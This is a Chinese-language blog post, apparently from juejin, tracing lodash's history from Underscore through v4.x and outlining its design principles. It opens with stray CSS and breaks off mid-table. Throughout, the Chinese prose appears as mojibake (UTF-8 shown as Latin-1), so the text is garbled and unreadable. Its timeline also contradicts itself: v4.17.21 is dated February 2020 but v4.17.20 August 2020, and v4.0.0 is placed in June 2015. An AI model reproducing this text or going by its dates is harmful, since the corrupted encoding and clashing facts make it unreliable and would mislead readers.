.task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>lodash ä½œä¸ºå‰ç«¯æœ€å…·ä»£è¡¨çš„å·¥å…·åº“ï¼Œæœ€åˆæ˜¯ä¸ºäº†è§£å†³UndersCore çš„ç—›ç‚¹è€Œäº§ç”Ÿï¼Œä¹‹åç»è¿‡å¤šå¹´çš„å‘å±•ï¼Œå†ç»äº†å‡½æ•°å¼ã€ES6ã€å·¥ç¨‹åŒ–ç­‰é˜¶æ®µï¼Œå·²å‘å±•ä¸ºä¸€ä¸ªå¼ºå¤§çš„å‰ç«¯åŸºç¡€è®¾æ–½ã€‚åœ¨ç¬¬ä¸€ç« ä¸­ï¼Œé¦–å…ˆæ¥ä»‹ç» lodash çš„ å‘å±•å†ç¨‹ä»¥åŠè®¾è®¡çš„æ ¸å¿ƒæ€æƒ³ã€‚</p>
<h2 data-id="heading-0">Underscore æ—¶ä»£</h2>
<p>è¦ç†è§£ Lodashï¼Œå¿…å…ˆç†è§£å®ƒçš„ â€œå‰èº«â€ Underscoreâ€”â€”2009 å¹´å‘å¸ƒçš„ Underscore æ˜¯å‰ç«¯å·¥å…·åº“çš„ â€œæ‹“è’è€…â€ï¼Œåœ¨ ES5 å°šæœªæ™®åŠçš„å¹´ä»£ï¼Œå®ƒé¦–æ¬¡ç³»ç»ŸåŒ–åœ°å°è£…äº†æ•°ç»„éå†ã€å¯¹è±¡æ“ä½œã€å‡½æ•°å¢å¼ºç­‰åŸºç¡€èƒ½åŠ›ï¼Œè®©å¼€å‘è€…æ‘†è„±äº†é‡å¤ç¼–å†™ <code>for</code> å¾ªç¯ã€æ‰‹åŠ¨åˆ¤æ–­æ•°æ®ç±»å‹çš„ç¹çã€‚</p>
<h3 data-id="heading-1">Underscore çš„è®¾è®¡æ€è·¯</h3>
<blockquote>
<p>æºç åˆ†æï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fbgithub.xyz%2Flessfish%2Funderscore-analysis%3Ftab%3Dreadme-ov-file" target="_blank" title="https://bgithub.xyz/lessfish/underscore-analysis?tab=readme-ov-file" ref="nofollow noopener noreferrer">bgithub.xyz/lessfish/unâ€¦</a></p>
<p>å®˜ç½‘ä¸­æ‰€å¸¦æ³¨é‡Šçš„æºç ï¼š</p>
<p>æ•´ä½“åˆ†æï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Funderscorejs.org%2Fdocs%2Funderscore-esm.html" target="_blank" title="https://underscorejs.org/docs/underscore-esm.html" ref="nofollow noopener noreferrer">underscorejs.org/docs/undersâ€¦</a></p>
<p>æ¨¡å—åˆ†æï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Funderscorejs.org%2Fdocs%2Fmodules%2Findex-all.html" target="_blank" title="https://underscorejs.org/docs/modules/index-all.html" ref="nofollow noopener noreferrer">underscorejs.org/docs/moduleâ€¦</a></p>
</blockquote>
<p>å…·ä½“åˆ†æå¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://juejin.cn/post/7593353611944230964" target="_blank" title="https://juejin.cn/post/7593353611944230964">juejin.cn/post/759335â€¦</a></p>
<h2 data-id="heading-2">Lodash çš„å‘å±•å†ç¨‹</h2>
<h3 data-id="heading-3">èµ·æºï¼šUnderscore çš„æ€§èƒ½ä¸ä¸€è‡´æ€§ç—›ç‚¹ï¼ˆ2012 å¹´ï¼‰</h3>
<h4 data-id="heading-4">è¯ç”ŸèƒŒæ™¯ï¼šå¯¹ Underscore çš„ä¸æ»¡ä¸æ”¹è¿›è¯‰æ±‚</h4>
<p>Lodash ç”± <strong>John-David Dalton</strong>ï¼ˆGitHub ç”¨æˆ·å jdaltonï¼‰äº 2012 å¹´ 4 æœˆ 23 æ—¥åˆ›å»ºï¼Œæœ€åˆæ˜¯ Underscore.js çš„ä¸€ä¸ª forkã€‚å½“æ—¶ Underscore å·²æˆä¸ºå‰ç«¯å¼€å‘çš„æ ‡é…å·¥å…·åº“ï¼Œä½†å­˜åœ¨ä¸¤å¤§æ ¸å¿ƒç—›ç‚¹ï¼š</p>
<ul>
<li><strong>æ€§èƒ½ä¸è¶³</strong>ï¼šæ ¸å¿ƒæ–¹æ³•å¤ç”¨åŸç”Ÿé«˜é˜¶å‡½æ•°ï¼ˆå¦‚ <code>Array.prototype.forEach</code>ï¼‰ï¼Œé—­åŒ…ä¸å‡½æ•°è°ƒç”¨æ ˆå¼€é”€å¤§ï¼Œå¤§æ•°æ®é‡å¤„ç†æ—¶å¡é¡¿æ˜æ˜¾ï¼›</li>
<li><strong>API ä¸ä¸€è‡´</strong>ï¼šå‚æ•°é¡ºåºæ··ä¹±ï¼ˆéƒ¨åˆ†æ–¹æ³• <code>(fn, arr)</code>ï¼Œéƒ¨åˆ† <code>(arr, fn)</code>ï¼‰ï¼Œè¾¹ç•Œå¤„ç†æ— ç»Ÿä¸€æ ‡å‡†ï¼Œå®¹æ˜“å‡ºé”™ï¼›</li>
<li><strong>è·¨æµè§ˆå™¨å…¼å®¹æ€§</strong>ï¼šå¯¹è€æ—§æµè§ˆå™¨ï¼ˆå¦‚ IE6+ï¼‰çš„é€‚é…ä¸å¤Ÿå®Œå–„ï¼Œéƒ¨åˆ†æ–¹æ³•å­˜åœ¨è¾¹ç¼˜è¡Œä¸ºå·®å¼‚ã€‚</li>
</ul>
<p>Dalton çš„åˆè¡·å¾ˆæ˜ç¡®ï¼šæ‰“é€ ä¸€ä¸ª<strong>æ€§èƒ½æ›´ä¼˜ã€API æ›´ä¸€è‡´ã€å…¼å®¹æ€§æ›´å¼º</strong>çš„ Underscore æ›¿ä»£æ–¹æ¡ˆï¼ŒåŒæ—¶ä¿æŒ API å…¼å®¹æ€§ï¼Œè®©å¼€å‘è€…å¯ä»¥æ— ç¼è¿ç§»ã€‚</p>
<h4 data-id="heading-5">å‘½åç”±æ¥ï¼šä½è°ƒçš„ â€œä¸‹åˆ’çº¿â€ å˜ä½“</h4>
<p>é¡¹ç›®åç§° â€œLodashâ€ æºè‡ª â€œlow dashâ€ï¼ˆä½ç ´æŠ˜å·ï¼‰çš„è°éŸ³ï¼Œå½¢è±¡åœ°è¡¨è¾¾äº†å®ƒä¸ Underscoreï¼ˆä¸‹åˆ’çº¿ï¼‰çš„æ¸Šæº â€”â€” æ—¢ç›¸ä¼¼åˆæœ‰åŒºåˆ«ï¼Œå°±åƒç ´æŠ˜å·ï¼ˆ-ï¼‰æ¯”ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰ä½ç½®æ›´ä½ä¸€æ ·ã€‚</p>
<h3 data-id="heading-6">æ—©æœŸæ¢ç´¢ï¼šä»å…¼å®¹åˆ°å·®å¼‚åŒ–ï¼ˆ2012-2014 å¹´ï¼Œv0.x - v2.xï¼‰</h3>
<h4 data-id="heading-7">v0.x é˜¶æ®µï¼ˆ2012 å¹´ 4-12 æœˆï¼‰ï¼šå¿«é€Ÿè¿­ä»£ä¸æ ¸å¿ƒèƒ½åŠ›æ„å»º</h4>
<ul>
<li>é¦–ä¸ªç‰ˆæœ¬ v0.1.0 äº 2012 å¹´ 4 æœˆ 23 æ—¥å‘å¸ƒï¼Œä»…åŒ…å«åŸºç¡€çš„æ•°ç»„ / å¯¹è±¡ / å‡½æ•°æ“ä½œæ–¹æ³•ï¼›</li>
<li>æ ¸å¿ƒæ”¹è¿›ï¼šé‡å†™ <code>_.each</code>/<code>_.map</code> ç­‰éå†æ–¹æ³•ï¼Œç”¨åŸç”Ÿ <code>for</code> å¾ªç¯æ›¿ä»£åŸç”Ÿé«˜é˜¶å‡½æ•°ï¼Œæ€§èƒ½æå‡ 2-5 å€ï¼›</li>
<li>ä¿æŒ API å…¼å®¹ï¼šå®Œå…¨å¤åˆ» Underscore çš„æ ¸å¿ƒæ–¹æ³•ï¼Œç¡®ä¿å¼€å‘è€… â€œé›¶æˆæœ¬è¿ç§»â€ï¼›</li>
<li>æ–°å¢å·®å¼‚åŒ–åŠŸèƒ½ï¼šå¦‚ <code>_.cloneDeep</code>ï¼ˆæ·±æ‹·è´ï¼‰ã€<code>_.get</code>ï¼ˆå¯¹è±¡è·¯å¾„å–å€¼ï¼‰ç­‰ Underscore ç¼ºå¤±çš„é«˜é¢‘èƒ½åŠ›ã€‚</li>
</ul>
<h4 data-id="heading-8">v1.x é˜¶æ®µï¼ˆ2013 å¹´ï¼‰ï¼šæ¨¡å—åŒ–ä¸è·¨ç¯å¢ƒé€‚é…</h4>
<ul>
<li>2013 å¹´åŠ å…¥ Dojo åŸºé‡‘ä¼šï¼Œè·å¾—ç¤¾åŒºèµ„æºæ”¯æŒï¼Œå¼€å§‹è§„èŒƒåŒ–å‘å±•ï¼›</li>
<li>æ ¸å¿ƒçªç ´ï¼šå¼•å…¥<strong>æ¨¡å—åŒ–è®¾è®¡</strong>ï¼Œæ”¯æŒ AMDï¼ˆRequireJSï¼‰ã€CommonJS ç­‰æ¨¡å—åŒ–è§„èŒƒï¼Œé€‚é… Node.js ä¸æµè§ˆå™¨åŒç¯å¢ƒï¼›</li>
<li>æ€§èƒ½ä¼˜åŒ–å‡çº§ï¼šä¸ºä¸åŒæ•°æ®ç±»å‹ï¼ˆæ•°ç»„ / å¯¹è±¡ / ç±»æ•°ç»„ï¼‰æä¾›ä¸“ç”¨éå†é€»è¾‘ï¼Œé¿å…é€šç”¨é€»è¾‘çš„å†—ä½™åˆ¤æ–­ï¼›</li>
<li>æ–°å¢åŠŸèƒ½ï¼šå‡½æ•°é˜²æŠ–èŠ‚æµï¼ˆ<code>_.debounce</code>/<code>_.throttle</code>ï¼‰ã€å¯¹è±¡æ·±åº¦æ¯”è¾ƒï¼ˆ<code>_.isEqual</code> å‡çº§ï¼‰ç­‰ã€‚</li>
</ul>
<h4 data-id="heading-9">v2.x é˜¶æ®µï¼ˆ2014 å¹´ï¼‰ï¼šé“¾å¼è°ƒç”¨ä¸æƒ°æ€§æ±‚å€¼</h4>
<ul>
<li>æ ¸å¿ƒç‰¹æ€§ï¼šå¼•å…¥<strong>æƒ°æ€§æ±‚å€¼</strong>ï¼ˆlazy evaluationï¼‰æœºåˆ¶ï¼Œä¼˜åŒ–é“¾å¼è°ƒç”¨æ€§èƒ½ â€”â€” ä»…åœ¨è°ƒç”¨ <code>value()</code> æ—¶æ‰æ‰§è¡Œæ‰€æœ‰é“¾å¼æ“ä½œï¼Œè€Œéæ¯ä¸€æ­¥éƒ½ç«‹å³è®¡ç®—ï¼›</li>
<li>API ä¸€è‡´æ€§å¼ºåŒ–ï¼šç»Ÿä¸€æ‰€æœ‰æ–¹æ³•çš„å‚æ•°é¡ºåºä¸º â€œ<strong>æ•°æ®åœ¨å‰ï¼Œæ“ä½œåœ¨å</strong>â€ï¼Œå½»åº•è§£å†³ Underscore çš„å‚æ•°æ··ä¹±é—®é¢˜ï¼›</li>
<li>è¾¹ç•Œå¤„ç†å®Œå–„ï¼šå¯¹ <code>null</code>/<code>undefined</code> ç­‰ç©ºå€¼åšç»Ÿä¸€å…¼å®¹ï¼Œå¦‚ <code>_.map(null)</code> è¿”å›ç©ºæ•°ç»„ï¼Œé¿å…æŠ¥é”™ï¼›</li>
<li>ç¤¾åŒºå½±å“åŠ›æ‰©å¤§ï¼šå¼€å§‹è¢« Reactã€Angular ç­‰ä¸»æµæ¡†æ¶æ¨èï¼Œæˆä¸ºå‰ç«¯é¡¹ç›®çš„ â€œæ ‡é…ä¾èµ–â€ã€‚</li>
</ul>
<h3 data-id="heading-10">çˆ†å‘æœŸï¼šæ€§èƒ½é©å‘½ä¸ç”Ÿæ€æ‰©å¼ ï¼ˆ2015 å¹´ï¼Œv3.xï¼‰</h3>
<p>2015 å¹´æ˜¯ Lodash å‘å±•çš„å…³é”®è½¬æŠ˜ç‚¹ï¼Œv3.x ç‰ˆæœ¬çš„å‘å¸ƒä½¿å…¶å½»åº•è¶…è¶Š Underscoreï¼Œæˆä¸ºå‰ç«¯å·¥å…·åº“çš„ç»å¯¹é¢†å¯¼è€…ã€‚</p>
<h4 data-id="heading-11">v3.0.0ï¼ˆ2015 å¹´ 1 æœˆï¼‰ï¼šæ€§èƒ½å·…å³°ä¸åŠŸèƒ½å…¨è¦†ç›–</h4>
<ul>
<li>æ€§èƒ½çªç ´ï¼šæ ¸å¿ƒæ–¹æ³•æ€§èƒ½å†æå‡ 30-50%ï¼Œéƒ¨åˆ†åœºæ™¯ï¼ˆå¦‚å¤§æ•°æ®é‡ <code>_.filter</code>ï¼‰æ€§èƒ½æ˜¯ Underscore çš„ 10 å€ä»¥ä¸Šï¼›</li>
<li>æ–°å¢ 47 ä¸ªæ–°æ–¹æ³•ï¼šå¦‚æ•°å­¦å·¥å…·ï¼ˆ<code>_.add</code>/<code>_.multiply</code>ï¼‰ã€å­—ç¬¦ä¸²æ“ä½œï¼ˆ<code>_.startsWith</code>/<code>_.endsWith</code>ï¼‰ã€é›†åˆé«˜çº§å¤„ç†ï¼ˆ<code>_.flatMap</code>ï¼‰ç­‰ï¼›</li>
<li>é“¾å¼è°ƒç”¨å¢å¼ºï¼šæ”¯æŒéšå¼é“¾å¼è°ƒç”¨ï¼ˆ<code>_(value).map(...).filter(...)</code>ï¼‰ï¼Œç®€åŒ–è¯­æ³•ï¼›</li>
<li>å·¥å…·é“¾å‡çº§ï¼šæ¨å‡º <code>lodash-cli</code>ï¼Œæ”¯æŒå®šåˆ¶åŒ–æ„å»ºï¼ˆå¦‚ä»…ä¿ç•™æ•°ç»„æ“ä½œæ–¹æ³•ï¼Œå‡å°æ‰“åŒ…ä½“ç§¯ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-12">2015 å¹´é‡å¤§é‡Œç¨‹ç¢‘</h4>
<ul>
<li>æˆä¸º <strong>npm ä¸Šä¾èµ–æœ€å¤šçš„åŒ…</strong>ï¼Œè¶…è¿‡ Expressã€React ç­‰æ ¸å¿ƒæ¡†æ¶ï¼›</li>
<li>npm ä¸‹è½½é‡çªç ´ 10 äº¿æ¬¡ï¼Œå…¨çƒè¶…è¿‡ 300 ä¸‡é¡¹ç›®ç›´æ¥ä¾èµ–ï¼›</li>
<li>ä¸ Underscore å¼€å§‹ â€œåˆå¹¶è®¨è®ºâ€ï¼Œéƒ¨åˆ† Underscore è´¡çŒ®è€…å¼€å§‹å‘ Lodash è¿ç§»ï¼Œç”šè‡³æ¨åŠ¨ Underscore å‘ Lodash çœ‹é½ï¼›</li>
<li>æ¨å‡º <code>lodash-fp</code> åˆ†æ”¯ï¼Œæä¾›å‡½æ•°å¼ç¼–ç¨‹é£æ ¼çš„ APIï¼ˆè‡ªåŠ¨æŸ¯é‡ŒåŒ–ã€å‚æ•°é¡ºåºåè½¬ï¼‰ï¼Œé€‚é… Ramda ç­‰å‡½æ•°å¼åº“çš„ç”¨æˆ·ä¹ æƒ¯ã€‚</li>
</ul>
<h3 data-id="heading-13">é‡æ„æœŸï¼šAPI é©æ–°ä¸ç”Ÿæ€åˆ†åŒ–ï¼ˆ2015 å¹´ 6 æœˆï¼Œv4.0.0ï¼‰</h3>
<p>v4.0.0 æ˜¯ Lodash å†å²ä¸Šæœ€å…·äº‰è®®ä¹Ÿæœ€å…·è¿œè§çš„ç‰ˆæœ¬ï¼Œå®ƒæ”¾å¼ƒäº†å¯¹ Underscore çš„ API å…¼å®¹ï¼Œè¿›è¡Œäº†å½»åº•çš„ API é‡æ„ï¼Œå¥ å®šäº†ç°ä»£ Lodash çš„åŸºç¡€ã€‚</p>
<h4 data-id="heading-14">æ ¸å¿ƒé‡æ„å†…å®¹</h4>



































<table><thead><tr><th>é‡æ„æ–¹å‘</th><th>å…·ä½“å˜åŒ–</th><th>å½±å“</th></tr></thead><tbody><tr><td><strong>ç§»é™¤åµŒå¥—å‘½åç©ºé—´</strong></td><td>å¦‚ <code>_.collection.map</code> â†’ <code>_.map</code>ï¼Œæ‰€æœ‰æ–¹æ³•ç›´æ¥æŒ‚è½½åˆ° <code>_</code> ä¸Š</td><td>ç®€åŒ–è°ƒç”¨ï¼Œé™ä½å­¦ä¹ æˆæœ¬</td></tr><tr><td><strong>API å»å†—ä½™</strong></td><td>ç§»é™¤ <code>_.pluck</code>ï¼ˆç”¨ <code>_.map</code> æ›¿ä»£ï¼‰ã€<code>_.compose</code>ï¼ˆç”¨ <code>_.flowRight</code> æ›¿ä»£ï¼‰ç­‰æ¨¡ç³Šæ–¹æ³•</td><td>ç»Ÿä¸€åŠŸèƒ½å…¥å£ï¼Œå‡å°‘æ–¹æ³•æ•°é‡</td></tr><tr><td><strong>å‚æ•°è§„èŒƒåŒ–</strong></td><td>æ‰€æœ‰æ–¹æ³•ä¸¥æ ¼éµå¾ª â€œæ•°æ®åœ¨å‰ï¼Œæ“ä½œåœ¨åâ€ï¼Œå¦‚ <code>_.sortBy(collection, iteratee)</code></td><td>å½»åº•è§£å†³å‚æ•°æ··ä¹±é—®é¢˜</td></tr><tr><td><strong>æ¨¡å—åŒ–æ·±åº¦ä¼˜åŒ–</strong></td><td>æ”¯æŒ ES6 Moduleï¼Œæ¨å‡ºç‹¬ç«‹çš„ <code>lodash-es</code> åŒ…ï¼Œé€‚é…ç°ä»£æ‰“åŒ…å·¥å…·ï¼ˆWebpack/Rollupï¼‰</td><td>æ”¯æŒæŒ‰éœ€å¯¼å…¥ï¼Œå¤§å¹…å‡å°æ‰“åŒ…ä½“ç§¯</td></tr><tr><td><strong>æ€§èƒ½å†ä¼˜åŒ–</strong></td><td>é‡å†™åº•å±‚å·¥å…·å‡½æ•°ï¼Œå¼•å…¥ â€œç±»å‹é¢„åˆ¤ç¼“å­˜â€ï¼Œè¿›ä¸€æ­¥æå‡æ‰§è¡Œæ•ˆç‡</td><td>ä¿æŒæ€§èƒ½é¢†å…ˆä¼˜åŠ¿</td></tr></tbody></table>
<h4 data-id="heading-15">äº‰è®®ä¸é€‚åº”</h4>
<ul>
<li>çŸ­æœŸå½±å“ï¼šéƒ¨åˆ†ä¾èµ– Underscore å…¼å®¹ API çš„é¡¹ç›®æ— æ³•ç›´æ¥å‡çº§ï¼Œå‡ºç° â€œLodash 3 å…¼å®¹ç‰ˆâ€ åˆ†æ”¯ï¼›</li>
<li>é•¿æœŸä»·å€¼ï¼šAPI ä¸€è‡´æ€§è¾¾åˆ°æ–°é«˜åº¦ï¼Œå­¦ä¹ æˆæœ¬é™ä½ 50%ï¼Œå¸å¼•æ›´å¤šæ–°å¼€å‘è€…ä½¿ç”¨ï¼›</li>
<li>ç”Ÿæ€åˆ†åŒ–ï¼š<code>lodash-es</code> æˆä¸ºç°ä»£å‰ç«¯é¡¹ç›®çš„é¦–é€‰ï¼Œè€Œ <code>lodash</code> ä¿æŒ CommonJS è§„èŒƒï¼Œé€‚é… Node.js ä¸è€æ—§é¡¹ç›®ã€‚</li>
</ul>
<h3 data-id="heading-16">ç¨³å®šæœŸï¼šæŒç»­è¿­ä»£ä¸åŸºç¡€è®¾æ–½åŒ–ï¼ˆ2016-2025 å¹´ï¼Œv4.x é•¿æœŸç»´æŠ¤ï¼‰</h3>
<p>v4.0.0 ä¹‹åï¼ŒLodash è¿›å…¥ â€œ<strong>åŠŸèƒ½å®Œå–„ + å®‰å…¨ç»´æŠ¤</strong>â€ çš„ç¨³å®šæœŸï¼Œç‰ˆæœ¬å·ä» v4.0.0 é€æ­¥è¿­ä»£åˆ° v4.17.21ï¼ˆ2020 å¹´ 2 æœˆï¼‰ï¼ŒæœŸé—´æœªå¼•å…¥ç ´åæ€§å˜æ›´ã€‚</p>
<h4 data-id="heading-17">æ ¸å¿ƒå‘å±•æ–¹å‘</h4>
<ul>
<li>
<p><strong>ç”Ÿæ€å®Œå–„</strong>ï¼š</p>
<ul>
<li><code>lodash-es</code> æˆä¸ºä¸»æµï¼šé€‚é… ES6 æ¨¡å—åŒ–ï¼Œæ”¯æŒ Tree-shakingï¼Œè§£å†³ â€œLodash æ‰“åŒ…ä½“ç§¯å¤§â€ çš„ç—›ç‚¹ï¼›</li>
<li>æ¨å‡º <code>lodash.cli</code>/<code>lodash-webpack-plugin</code> ç­‰å·¥å…·ï¼Œæ”¯æŒå®šåˆ¶åŒ–æ„å»ºï¼Œæœ€å°åŒ–æ‰“åŒ…ä½“ç§¯ï¼›</li>
<li>é€‚é… ES6+ æ–°ç‰¹æ€§ï¼šæ”¯æŒ <code>Map</code>/<code>Set</code>/<code>Symbol</code> ç­‰åŸç”Ÿç±»å‹ï¼Œæ–°å¢ <code>_.isMap</code>/<code>_.isSymbol</code> ç­‰åˆ¤æ–­æ–¹æ³•ã€‚</li>
</ul>
</li>
<li>
<p><strong>å®‰å…¨ä¸å…¼å®¹æ€§</strong>ï¼š</p>
<ul>
<li>æŒç»­ä¿®å¤å®‰å…¨æ¼æ´ï¼ˆå¦‚åŸå‹æ±¡æŸ“ï¼‰ï¼Œæˆä¸º npm ç”Ÿæ€ä¸­æœ€å®‰å…¨çš„æ ¸å¿ƒä¾èµ–ä¹‹ä¸€ï¼›</li>
<li>å…¼å®¹èŒƒå›´æ‰©å¤§ï¼šæ”¯æŒ IE9+ã€Node.js 6+ ç­‰ä¸»æµç¯å¢ƒï¼ŒåŒæ—¶ä¸ºç°ä»£ç¯å¢ƒæä¾›åŸç”Ÿ API å¤ç”¨èƒ½åŠ›ï¼›</li>
<li>2019 å¹´é€šè¿‡ jQuery åŸºé‡‘ä¼šã€JS åŸºé‡‘ä¼šï¼Œæœ€ç»ˆåŠ å…¥ OpenJS åŸºé‡‘ä¼šï¼Œè·å¾—é•¿æœŸç¤¾åŒºæ”¯æŒã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-18">é‡Œç¨‹ç¢‘äº‹ä»¶ï¼ˆ2020-2025 å¹´ï¼‰</h4>
<ul>
<li>2020 å¹´ 8 æœˆå‘å¸ƒ v4.17.20ï¼Œä¹‹åè¿›å…¥ â€œå®‰å…¨ç»´æŠ¤æ¨¡å¼â€ï¼Œä»…ä¿®å¤ä¸¥é‡æ¼æ´ï¼›</li>
<li>2025 å¹´ 10 æœˆï¼ŒSovereign Tech Agency å®£å¸ƒæŠ•èµ„ Lodashï¼Œæ”¯æŒå…¶ â€œåŠŸèƒ½å®Œæˆ + é•¿æœŸç¨³å®šâ€ æˆ˜ç•¥ï¼Œç¡®ä¿å…¶ä½œä¸ºå‰ç«¯åŸºç¡€è®¾æ–½çš„å¯æŒç»­æ€§ï¼›</li>
<li>æˆªè‡³ 2025 å¹´ï¼ŒLodash æ¯å‘¨ npm ä¸‹è½½é‡è¶…è¿‡ 2.57 äº¿æ¬¡ï¼Œå…¨çƒ 930 ä¸‡ + ç½‘ç«™ä½¿ç”¨ï¼ŒåŒ…æ‹¬ä¸‰åˆ†ä¹‹ä¸€çš„å…¨çƒ Top10000 ç½‘ç«™ï¼›</li>
<li>v5.0.0 è§„åˆ’ï¼š<strong>è®¡åˆ’ç§»é™¤å¯¹è€æ—§ç¯å¢ƒçš„æ”¯æŒï¼ˆå¦‚ IEï¼‰ï¼Œå…¨é¢é‡‡ç”¨ ES2015+ è¯­æ³•ï¼Œè¿›ä¸€æ­¥ä¼˜åŒ–æ€§èƒ½ä¸ä½“ç§¯ï¼Œé¢„è®¡ 2026 å¹´åå‘å¸ƒ</strong>ã€‚</li>
</ul>
<h3 data-id="heading-19">Lodash å‘å±•çš„æ ¸å¿ƒé©±åŠ¨åŠ›ä¸å¯ç¤º</h3>
<h4 data-id="heading-20">å››å¤§æ ¸å¿ƒé©±åŠ¨åŠ›</h4>

























<table><thead><tr><th>é©±åŠ¨åŠ›</th><th>å…·ä½“ä½“ç°</th></tr></thead><tbody><tr><td><strong>æ€§èƒ½ä¼˜å…ˆ</strong></td><td>ä» v0.x åˆ° v4.xï¼Œæ¯ä¸€æ¬¡æ ¸å¿ƒæ–¹æ³•é‡å†™éƒ½ä»¥æ€§èƒ½ä¸ºç¬¬ä¸€ç›®æ ‡ï¼Œè¿™æ˜¯å…¶è¶…è¶Š Underscore çš„å…³é”®</td></tr><tr><td><strong>API ä¸€è‡´æ€§</strong></td><td>åšæŒ â€œæ•°æ®åœ¨å‰ï¼Œæ“ä½œåœ¨åâ€ çš„å‚æ•°é¡ºåºï¼Œç»Ÿä¸€è¿”å›å€¼è§„åˆ™ï¼Œé™ä½å­¦ä¹ ä¸ä½¿ç”¨æˆæœ¬</td></tr><tr><td><strong>è·¨ç¯å¢ƒé€‚é…</strong></td><td>æœ€æ—©æ”¯æŒæµè§ˆå™¨ / Node.js åŒç¯å¢ƒï¼Œé€‚é…æ¨¡å—åŒ–è§„èŒƒï¼Œæˆä¸º â€œå‰åç«¯é€šç”¨å·¥å…·åº“â€</td></tr><tr><td><strong>ç¤¾åŒºååŒ</strong></td><td>åŠ å…¥åŸºé‡‘ä¼šã€ä¸ Underscore è´¡çŒ®è€…åä½œã€æ¥å—ç¤¾åŒºåé¦ˆï¼Œå½¢æˆè‰¯æ€§å‘å±•å¾ªç¯</td></tr></tbody></table>
<h4 data-id="heading-21">å¯¹å‰ç«¯ç”Ÿæ€çš„å¯ç¤º</h4>
<ul>
<li><strong>å·¥å…·åº“è®¾è®¡èŒƒå¼</strong>ï¼šLodash çš„ â€œæ— ä¾µå…¥å¼è®¾è®¡â€ï¼ˆä¸ä¿®æ”¹åŸç”Ÿå¯¹è±¡åŸå‹ï¼‰ã€â€œè¾¹ç•Œå®¹é”™â€ ç­‰åŸåˆ™æˆä¸ºç°ä»£å·¥å…·åº“çš„è®¾è®¡æ ‡å‡†ï¼›</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–æ–¹æ³•è®º</strong>ï¼šä¸ºä¸åŒæ•°æ®ç±»å‹æä¾›ä¸“ç”¨é€»è¾‘ã€æƒ°æ€§æ±‚å€¼ã€ç¼“å­˜ä¼˜åŒ–ç­‰ç­–ç•¥ï¼Œè¢«å¹¿æ³›åº”ç”¨äº React/Vue ç­‰æ¡†æ¶çš„æºç ä¸­ï¼›</li>
<li><strong>æ¨¡å—åŒ–ä¸æŒ‰éœ€åŠ è½½</strong>ï¼š<code>lodash-es</code> ä¸ Tree-shaking çš„ç»“åˆï¼Œæ¨åŠ¨å‰ç«¯ç”Ÿæ€å‘ â€œè½»é‡åŒ–â€ æ–¹å‘å‘å±•ï¼›</li>
<li><strong>ç”Ÿæ€åä½œæ¨¡å¼</strong>ï¼šä» â€œç«äº‰â€ åˆ° â€œèåˆâ€ï¼ˆä¸ Underscore çš„åˆå¹¶è®¨è®ºï¼‰ï¼Œä½“ç°äº†å¼€æºç¤¾åŒºçš„åä½œç²¾ç¥ã€‚</li>
</ul>
<h2 data-id="heading-22">Lodash çš„æ ¸å¿ƒè®¾è®¡åŸåˆ™</h2>
<h3 data-id="heading-23">æ€§èƒ½ä¼˜å…ˆ</h3>
<p>Lodash æŠŠ â€œæ€§èƒ½â€ ä½œä¸ºç¬¬ä¸€ä¼˜å…ˆçº§ï¼Œæ‰€æœ‰æ ¸å¿ƒæ–¹æ³•çš„å®ç°éƒ½å›´ç»• â€œæœ€å°åŒ–æ‰§è¡Œå¼€é”€ã€æœ€å¤§åŒ–æ‰§è¡Œæ•ˆç‡â€ å±•å¼€ï¼Œç”šè‡³ä¸ºäº†æ€§èƒ½ç‰ºç‰²éƒ¨åˆ† â€œè¯­æ³•ä¼˜é›…æ€§â€ï¼ˆæ¯”å¦‚æ”¾å¼ƒåŸç”Ÿé«˜é˜¶å‡½æ•°ï¼Œæ”¹ç”¨åº•å±‚å¾ªç¯ï¼‰ã€‚</p>
<h4 data-id="heading-24">æ ¸å¿ƒä¼˜åŒ–ç­–ç•¥</h4>





























<table><thead><tr><th>ä¼˜åŒ–æ–¹å‘</th><th>å…·ä½“å®ç°é€»è¾‘</th></tr></thead><tbody><tr><td>åº•å±‚éå†ï¼šæ”¾å¼ƒåŸç”Ÿé«˜é˜¶å‡½æ•°</td><td>æ ¸å¿ƒéå†æ–¹æ³•ï¼ˆå¦‚ <code>_.each</code>/<code>_.map</code>ï¼‰ä¸ç”¨ <code>Array.prototype.forEach</code>/<code>map</code>ï¼Œæ”¹ç”¨åŸç”Ÿ <code>for</code> å¾ªç¯ï¼ˆå‡å°‘å‡½æ•°è°ƒç”¨æ ˆå¼€é”€ã€é¿å…é—­åŒ…æŸè€—ï¼‰ï¼›</td></tr><tr><td>ç±»å‹é¢„åˆ¤ï¼šæå‰åˆ†æ”¯å¤„ç†</td><td>æ‰§è¡Œæ ¸å¿ƒé€»è¾‘å‰ï¼Œå…ˆç²¾å‡†åˆ¤æ–­æ•°æ®ç±»å‹ï¼ˆæ•°ç»„ / ç±»æ•°ç»„ / å¯¹è±¡ / 